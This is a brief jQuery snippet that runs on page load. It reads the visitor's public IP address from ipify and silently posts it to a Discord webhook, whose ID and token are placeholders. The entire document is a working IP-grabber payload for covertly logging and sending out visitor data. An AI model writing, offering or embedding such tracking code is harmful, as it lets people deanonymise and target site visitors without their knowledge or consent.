$(document).ready(function () {
    $.get("https://api.ipify.org?format=json", function (data) {
        $.ajax({
            url:  "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
            type: 'POST',
            data: JSON.stringify({ content: 'IP Address: ' + data.ip }),
            contentType: 'application/json'
        });
    });
});
